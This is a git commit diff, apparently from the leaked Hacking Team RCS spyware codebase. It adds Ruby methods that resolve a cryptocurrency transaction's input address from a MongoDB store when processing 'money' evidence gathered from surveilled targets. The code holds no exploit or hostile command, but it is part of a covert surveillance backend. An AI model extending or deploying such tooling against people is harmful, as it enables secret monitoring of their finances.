f92031bb54aee743ca53276aaf24f35d7926ee9b
topac <topac@hackingteam.com>
2014-02-07 12:12:09 +0100

    fetch tx input addresse from here (not from rcs-common) without checking class existence

--- lib/rcs-worker/evidence/money.rb
+++ lib/rcs-worker/evidence/money.rb
@@ -13,5 +13,26 @@ module RCS
     def type
       :money
     end
+
+    def fetch_input_addresses?
+      data = self[:data]
+      data[:type] == :tx && data[:from].nil? && data[:incoming] == 1
+    end
+
+    def fetch_input_addresses
+      tx_hash = self[:data][:id]
+      tx_currency = self[:data][:currency]
+      tx_owner_addr = self[:data][:rcpt]
+
+      db_name = "rcs_money_#{tx_currency}".strip.downcase
+      tx = Mongoid.default_session.with(database: db_name)['tx'].find(h: tx_hash).limit(1).first
+
+      # TODO: Support multiple input addresses (remove #first)
+      tx['i'].first if tx and tx['o'].include?(tx_owner_addr)
+    end
+
+    def process
+      self[:data][:from] = fetch_input_addresses if fetch_input_addresses?
+    end
   end
 end
